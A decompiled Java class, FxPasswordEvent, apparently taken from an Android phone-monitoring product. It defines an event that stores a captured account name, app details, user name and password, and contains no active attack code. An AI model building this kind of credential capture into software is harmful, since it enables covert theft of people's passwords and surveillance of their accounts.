package com.vvt.events;

import com.vvt.base.FxEvent;
import com.vvt.base.FxEventType;

public class FxPasswordEvent
  extends FxEvent
{
  private String mAccountName;
  private String mAppId;
  private String mAppName;
  private FxAppType mAppType;
  private String mPassword;
  private String mUserName;
  
  public String getAccountName()
  {
    return this.mAccountName;
  }
  
  public String getAppId()
  {
    return this.mAppId;
  }
  
  public String getAppName()
  {
    return this.mAppName;
  }
  
  public FxAppType getAppType()
  {
    return this.mAppType;
  }
  
  public FxEventType getEventType()
  {
    return FxEventType.PASSWORD;
  }
  
  public String getPassword()
  {
    return this.mPassword;
  }
  
  public String getUserName()
  {
    return this.mUserName;
  }
  
  public void setAccountName(String paramString)
  {
    this.mAccountName = paramString;
  }
  
  public void setAppId(String paramString)
  {
    this.mAppId = paramString;
  }
  
  public void setAppName(String paramString)
  {
    this.mAppName = paramString;
  }
  
  public void setAppType(FxAppType paramFxAppType)
  {
    this.mAppType = paramFxAppType;
  }
  
  public void setPassword(String paramString)
  {
    this.mPassword = paramString;
  }
  
  public void setUserName(String paramString)
  {
    this.mUserName = paramString;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/events/FxPasswordEvent.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */